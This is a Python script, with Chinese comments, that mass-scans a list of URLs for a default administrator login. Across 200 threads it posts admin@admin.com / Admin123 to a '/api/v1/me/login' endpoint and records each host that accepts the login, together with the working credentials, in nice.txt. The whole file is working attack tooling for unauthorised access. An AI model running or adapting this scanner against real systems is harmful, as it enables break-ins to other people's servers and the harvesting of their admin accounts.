import requests
import threading, queue, urllib3
import base64
import json
import hashlib
q = queue.Queue()
urllib3.disable_warnings()
headers = {'Content-Type': 'application/json'}
user = "admin@admin.com"
passwd1 = "Admin123"
passwd = hashlib.md5(passwd1.encode(encoding='UTF-8')).hexdigest()
data = {
        'email':user,
        'password':passwd,
        'remember_me':'false'
        }

#用于存放结果
# f = open('nice.txt',mode='a+',encoding="unicode_escape")
# data = json.dumps(data)
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
def fiel_querue():
    file = open('url.txt', encoding="unicode_escape")
    for x in file.readlines():
        if 'http://' in x.strip() or 'https://' in x.strip():
            q.put(x.strip())
        else:
            q.put('http://' + x.strip())
            q.put('https://' + x.strip())
    file.close()

def scan():
    while not q.empty():
        #从队列中获取url
        url = q.get()
        url = url+"/api/v1/me/login"
        try:
            cmdlist = requests.post(url=url,json=data,verify=False,headers=headers,timeout=10,proxies=proxies)
            # cmdlist = requests.post(url=url,json=data,verify=False,headers=headers,timeout=10)
            cmdshowlist =  cmdlist.text
            if cmdlist.status_code == 401 and "521" in cmdshowlist:
                print(url+'存在漏洞\n')
                with open('nice.txt', 'a+')as f:
                    f.write(url+' 存在弱口令漏洞，有人登录过\n')
                    f.write('user:admin@admin.com passwd:Admin123 \n')
                    f.write("============================\n")
            elif cmdlist.status_code == 204:
                print(url+'存在漏洞\n')
                with open('nice.txt', 'a')as f:
                    f.write(url+' 存在弱口令漏洞，无人登录过\n')
                    f.write('user:%s passwd:%s \n',user,passwd1)
                    f.write("============================\n")
            else:
                print('不存在漏洞\n') 
                pass
        except:
            print("发包问题\n")
            pass


# f.close()



def main():
    logo = "ICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICBfXyAgICAgICAuX19fCiAgICAgICAgICAgICAgICAgICAgfCAgfCBfX19fX18gIF9fX19fX19fX19fICB8ICB8IF9fIF9ffCBfLwogICAgICAgICAgICAgICAgICAgIHwgIHwvIC8gIF8gXC8gIF9fXy9cX18gIFwgfCAgfC8gLy8gX18gfCAKICAgICAgICAgICAgICAgICAgICB8ICAgIDwgIDxfPiApX19fIFwgIC8gX18gXHwgICAgPC8gL18vIHwgCiAgICAgICAgICAgICAgICAgICAgfF9ffF8gXF9fX18vX19fXyAgPihfX19fICAvX198XyBcX19fXyB8IAogICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICBcLyAgICAgIFwvICAgICBcLyAgICBcLyAK"
    print(str(base64.b64decode(logo), "utf-8"))
    fiel_querue()
    th = []
    th_num = 200
    for x in range(th_num):
        t = threading.Thread(target=scan)
        th.append(t)
    for x in range(th_num):
        th[x].start()
    for x in range(th_num):
        th[x].join()

if __name__ == '__main__':
    main()